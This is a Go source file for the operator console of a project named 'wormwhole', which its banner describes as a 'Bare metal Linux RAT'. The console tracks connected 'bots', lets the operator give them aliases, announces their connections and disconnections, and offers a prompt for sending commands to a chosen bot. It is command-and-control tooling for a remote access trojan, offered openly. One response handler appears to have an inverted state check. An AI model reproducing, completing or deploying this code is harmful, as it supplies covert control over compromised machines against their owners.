package console

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"github.com/steveyen/gkvlite"
	"github.com/xorium/wormwhole/core"
	"github.com/xorium/wormwhole/server"
	"log"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync"
)

const (
	stateReady            = iota
	stateExecutingCommand = iota
)

type Console struct {
	*sync.RWMutex
	Debug            bool
	srv              *server.CommandServer
	reader           *bufio.Reader
	currentBot       *server.Bot
	currentState     int
	bots             *gkvlite.Collection
	commandsHandlers map[*regexp.Regexp]func([]string) error
	currentBotsList  []*server.Bot
}

func NewConsole(srv *server.CommandServer) *Console {
	f, err := os.OpenFile("wormwhole.gkvlite", os.O_CREATE|os.O_RDWR, os.ModePerm)
	if err != nil {
		log.Fatal(err)
	}
	s, err := gkvlite.NewStore(f)
	if err != nil {
		log.Fatal(err)
	}
	bots := s.GetCollection("bots")

	c := &Console{
		RWMutex:      new(sync.RWMutex),
		srv:          srv,
		reader:       bufio.NewReader(os.Stdin),
		bots:         bots,
		currentState: stateReady,
	}

	c.initCommands()
	c.initServerHandlers()
	c.startInterruptHandling()

	return c
}

func (c *Console) startInterruptHandling() {
	go func() {
		sigChan := make(chan os.Signal)
		for {
			signal.Notify(sigChan, os.Interrupt)
			<-sigChan

			currentCommands := c.srv.ListCommands()
			// TODO: send interrupt signal to client.
			for _, command := range currentCommands {
				command.SetState(core.CommandStateInterrupted)
			}
			c.Lock()
			c.currentState = stateReady
			c.Unlock()
			fmt.Println()
			c.printCommandInvitation()
		}
	}()
}

func (c *Console) initServerHandlers() {
	c.srv.OnConnect(func(bot *server.Bot) {
		printer := color.New(color.FgHiGreen, color.Bold)
		_, _ = printer.Printf("[+] bot connected: %s\n", bot.String())
	})

	c.srv.OnDisconnect(func(bot *server.Bot) {
		printer := color.New(color.FgHiRed, color.Bold)
		_, _ = printer.Printf("[-] bot disconnected: %s\n", bot.String())
		if c.currentBot != nil && c.currentBot.ID == bot.ID {
			c.Lock()
			c.currentBot = nil
			c.currentState = stateReady
			c.Unlock()
		}
	})

	c.srv.OnCommandRespHandler(func(cmd *core.Command, resp []byte) {
		if cmd.State() != core.CommandStateInterrupted {
			if c.Debug {
				log.Println("interrupted command: ", cmd)
			}
			return
		}
		c.Lock()
		c.currentState = stateReady
		c.Unlock()
		if cmd.State() == core.CommandStateFailed {
			color.HiRed("command error: %s\n", string(resp))
			return
		}
		color.White(string(resp))
		c.printCommandInvitation()
	})
}

func (c *Console) getBotString(bot *server.Bot) string {
	botAlias := c.getAlias(bot.ID)
	botStr := bot.String()
	if botAlias != "" {
		botStr = botAlias
	}
	return botStr
}

func (c *Console) getAlias(botId string) string {
	alias, err := c.bots.Get([]byte("alias:" + botId))
	if err != nil {
		log.Println("error while getting bot alias: ", err)
		return ""
	}
	if alias == nil {
		return ""
	} else {
		return string(alias)
	}
}

func (c *Console) saveAlias(botId, alias string) {
	c.Lock()
	err := c.bots.Set([]byte("alias:"+botId), []byte(alias))
	c.Unlock()
	if err != nil {
		log.Println("error while saving bot alias: ", err)
	}
}

func (c *Console) getInput() (string, error) {
	text, err := c.reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return text, nil
}

func (c *Console) printCommandInvitation() {
	prefix := "wormhole"
	c.RLock()
	defer c.RUnlock()
	if c.currentBot != nil {
		if c.currentState == stateExecutingCommand {
			return
		}
		alias := c.getAlias(c.currentBot.ID)
		if alias != "" {
			prefix = alias
		} else {
			prefix = c.currentBot.IP
		}
	}
	printer := color.New(color.FgHiGreen)
	_, _ = printer.Printf(prefix + "> ")
}

func (c *Console) printBanner() {
	banner := `
██╗    ██╗ ██████╗ ██████╗ ███╗   ███╗██╗  ██╗ ██████╗ ██╗     ███████╗
██║    ██║██╔═══██╗██╔══██╗████╗ ████║██║  ██║██╔═══██╗██║     ██╔════╝
██║ █╗ ██║██║   ██║██████╔╝██╔████╔██║███████║██║   ██║██║     █████╗  
██║███╗██║██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║██║   ██║██║     ██╔══╝  
╚███╔███╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗███████╗
 ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
                       Bare metal Linux RAT
`
	color.Green(banner)
}

func (c *Console) Run() {
	c.printBanner()
	for {
		c.printCommandInvitation()
		text, err := c.getInput()
		if err != nil {
			log.Println("error while getting command input: ", err)
			continue
		}
		text = strings.TrimRight(text, "\n")
		if text == "" {
			continue
		}
		if err := c.handleCommandInput(text); err != nil {
			color.HiRed(err.Error())
		}
	}
}
